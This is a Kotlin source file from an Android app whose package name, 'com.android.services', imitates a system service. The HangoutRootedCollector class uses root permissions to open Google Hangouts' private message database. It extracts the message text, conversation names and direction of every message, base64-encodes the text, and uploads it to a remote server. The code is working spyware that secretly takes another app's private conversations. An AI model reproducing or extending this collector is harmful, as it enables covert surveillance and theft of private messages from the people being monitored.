package com.android.services.logs.collectors.im

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import com.android.services.db.entities.HangoutRooted
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerOneApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.RootPermission.setPermissionHangoutsDB
import com.android.services.util.RootPermission.setPermissionHangoutsDirectory
import com.android.services.util.logException
import com.android.services.util.logVerbose
import java.io.File
import java.util.*

class HangoutRootedCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncHangouts) {
            try {
                val lineList = retrieveHangoutMessages(context, localDatabaseSource)
                if (lineList.isNotEmpty()) {
                    val startDate = lineList[lineList.size - 1].date
                    val endDate = lineList[0].date
                    val mHangoutSender = RemoteServerHelper(
                        context,
                        AppConstants.HANGOUT_ROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startDate = startDate,
                        endDate = endDate
                    )
                    mHangoutSender.upload(lineList)
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.HANGOUT_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
        } else {
            logVerbose("${AppConstants.HANGOUT_ROOTED_TYPE} Sync is Off")
        }
    }

    companion object {

        private const val hangoutFolder = "com.google.android.talk"
        private const val hangoutDir = "/data/data/com.google.android.talk/databases/"

        private fun retrieveHangoutMessages(
            context: Context,
            localDatabaseSource: LocalDatabaseSource,
        ): List<HangoutRooted> {
            var hangoutList = ArrayList<HangoutRooted>()
            var max = 0
            var hangoutDB = ""

            try {
                setPermissionHangoutsDirectory()
                val hangoutPath = File(hangoutDir)
                val files = AppUtils.getFilesListInDirectory(hangoutPath)
                for (j in files.indices) {
                    if (files[j].contains("babel")) {
                        val value = files[j][5].toString()
                        val intValue = value.toInt()
                        if (intValue > max) max = intValue
                    }
                }
                hangoutDB = "babel$max.db"
            } catch (e: Exception) {
                logException(e.message!!)
            }
            if (hangoutDB != "") {
                setPermissionHangoutsDB(hangoutDB)
                try {
                    val hangoutDatabase = ("/data/data/"
                            + hangoutFolder
                            + "/databases/"
                            + hangoutDB)

                    val database =
                        SQLiteDatabase.openDatabase(hangoutDatabase,
                            null,
                            SQLiteDatabase.OPEN_READONLY)
                    val selection: String?
                    val selectionArgs: Array<String>?
                    val since: String
                    val maxTimeStamp = localDatabaseSource.selectHangoutRootedMaxTimeStamp() ?: "0"
                    since = maxTimeStamp.toString()
                    if (since.isNotEmpty()) {
                        selection = String.format("%s > ?", "timestamp")
                        selectionArgs = arrayOf(since)
                    } else {
                        selection = null
                        selectionArgs = null
                    }

                    val c = database.query("messages",
                        null,
                        selection,
                        selectionArgs,
                        null,
                        null,
                        "timestamp DESC")
                    while (c.moveToNext()) {
                        try {
                            val timeStamp = c.getString(c.getColumnIndex("timestamp"))
                            val messageId = c.getString(c.getColumnIndex("message_id"))
                            val conversationId = c.getString(c.getColumnIndex("conversation_id"))
                            var conversationName = ""
                            val name = database.query("conversations", arrayOf("generated_name"),
                                "conversation_id=?", arrayOf(conversationId), null, null, null)
                            if (name.moveToFirst()) {
                                conversationName = name.getString(0)
                            }
                            name.close()
                            val messageText = c.getString(c.getColumnIndex("text"))
                            val messageType =
                                if (c.getString(c.getColumnIndex("type")) == "1") "outgoing" else "incoming"
                            val realTimeStamp = timeStamp.toLong() / 1000
                            val hangoutRooted = HangoutRooted()
                            hangoutRooted.apply {
                                this.conversationId = conversationId
                                this.conversationName = conversationName
                                this.message = AppUtils.convertStringToBase64(messageText)
                                this.type = messageType
                                this.messageDatetime = AppUtils.formatDate(realTimeStamp.toString())
                                this.messageId = messageId
                                this.timeStamp = timeStamp.toLong()
                                this.date = AppUtils.getDate(realTimeStamp)
                            }
                            hangoutList.add(hangoutRooted)
                        } catch (e: Exception) {
                            logVerbose(
                                "${AppConstants.HANGOUT_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                                throwable = e
                            )
                        }
                    }
                    c.close()
                    database.close()
                    logVerbose("${AppConstants.HANGOUT_ROOTED_TYPE} rooted list = $hangoutList")
                    if (hangoutList.isNotEmpty())
                        localDatabaseSource.insertHangoutRooted(hangoutList)
                    localDatabaseSource.selectHangoutRooted {
                        hangoutList = it as ArrayList<HangoutRooted>
                    }
                    logVerbose("${AppConstants.HANGOUT_ROOTED_TYPE} selected list = $hangoutList")
                } catch (e: Exception) {
                    logVerbose(
                        "${AppConstants.HANGOUT_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                        throwable = e
                    )
                }
            }
            return hangoutList
        }
    }
}